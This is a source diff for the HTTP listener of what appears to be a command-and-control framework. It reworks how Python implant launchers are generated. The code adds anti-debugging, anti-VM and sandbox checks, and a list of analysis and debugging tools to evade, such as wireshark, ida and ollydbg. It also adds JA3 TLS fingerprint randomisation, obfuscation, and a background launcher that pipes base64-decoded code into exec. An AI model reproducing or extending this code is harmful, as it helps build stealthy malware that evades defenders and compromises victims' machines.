@@ -29,8 +29,7 @@ class LauncherGen(object):
                  ua: str, cookie: str, key: str, headers: [], proxies: [], funcs: [str]):
         self.funcs = funcs
         # sourcery skip: low-code-quality
-        self.imports = '''
-import os, sys, re, subprocess, urllib.request
+        self.imports = '''import os, sys, re, subprocess, urllib.request
 '''
 
         self.static = '''
@@ -142,7 +141,7 @@ class Listener(object):
                     "Link": "https://nolink",
                 }
             ],
-            "Description": "Starts a http[s] listener that uses a GET/POST approach.",
+            "Description": "Starts a http[s] v2 listener that uses a GET/POST approach.",
             "Category": "client_server",
             "Comments": [],
             "Software": "",
@@ -240,32 +239,6 @@ class Listener(object):
                 "Required": False,
                 "Value": "default",
             },
-            "Obfuscation": {
-                "Description": "Obfuscate launcher with random data.",
-                "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-            },
-            "CheckDebug": {
-                "Description": "Anti-debug checks",
-                "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-            },
-            "CheckSpecs": {
-                "Description": "Check machine specs and try avoid VMS or sandboxes",
-                "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-            },
-            "CheckProcess": {
-                "Description": "Check process and avoid launcher execution. Checks for procs within the task list "
-                               "with 'contains' function. ('none' or comma divided)",
-                "Required": True,
-                "Value": "df5serv,fiddler,frida,gdb,httpdebugger,ida,joebox,ksdumper,ollydbg,pestudio,prl_cc,"
-                         "prl_tools,processhacker,qemu-ga,radare,regedit,taskmgr,vboxservice,vboxtray,vgauthservice,"
-                         "vmacthlp,vmsrvc,vmtoolsd,vmusrvc,vmware,wireshark,x32dbg,x96dbg,xenservice,snitch",
-            },
             "JA3_Evasion": {
                 "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
                 "Required": True,
@@ -356,10 +329,6 @@ class Listener(object):
         if not listener_options["Cookie"]["Value"]:
             listener_options["Cookie"]["Value"] = listener_util.generate_cookie()
         cookie = listener_options["Cookie"]["Value"]
-        obfuscation = listener_options["Obfuscation"]["Value"]
-        check_debug = listener_options["CheckDebug"]["Value"]
-        check_specs = listener_options["CheckSpecs"]["Value"]
-        check_process = listener_options["CheckProcess"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         custom_headers = profile.split("|")[2:]
@@ -382,36 +351,33 @@ class Listener(object):
             )).decode("UTF-8")
 
             additional_func = []
-            if check_debug == 'True':
+            obf_commands = obfuscation_command.split('|')
+            if 'debug:' in obfuscation_command:
+                log.info("Adding anti-debug code")
                 additional_func.append(python_anti_debug_checks())
-            if check_specs == 'True':
+            if 'specs:' in obfuscation_command:
+                log.info("Adding anti-vm spec code")
                 additional_func.append(python_specs_checks(build_arch))
-            if check_process and 'none' not in check_process:
-                additional_func.append(python_proc_checks(build_arch, check_process.split(',')))
+            if procs_comm := next(filter(lambda x: x.startswith('procs:'), obf_commands), None):
+                procs = procs_comm.split(':')
+                if len(procs) > 1:
+                    log.info("Adding proc fail safe code")
+                    additional_func.append(python_proc_checks(build_arch, procs[1].split(',')))
 
             gen = LauncherGen(host, port, stage0, userAgent, b64_routing_packet,
                               staging_key, custom_headers, proxies, additional_func).gen()
 
-            # if obfuscate:
-            #     launcherBase = self.mainMenu.obfuscationv2.obfuscate(
-            #         launcherBase,
-            #         obfuscation_command=obfuscation_command,
-            #     )
-            #     launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-            #         launcherBase
-            #     )
-            #
-            if encode:
-                encoded = base64.b64encode(
-                    gen.encode("UTF-8")
-                ).decode("UTF-8")
-                if isinstance(encoded, bytes):
-                    encoded = encoded.decode("UTF-8")
-                launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{encoded}'));\" | python3 &"
-                return launcher
-            else:
+            if obfuscate:
+                gen = py_obfuscate(gen)
+            if not encode:
                 return gen
 
+            encoded = base64.b64encode(
+                gen.encode("UTF-8")
+            ).decode("UTF-8")
+            if isinstance(encoded, bytes):
+                encoded = encoded.decode("UTF-8")
+            return f"""echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{encoded}'));\" | python3 &"""
         else:
             self.instance_log.error(
                 f"{listenerName}: listeners/http generate_launcher(): invalid language specification: only 'python' "
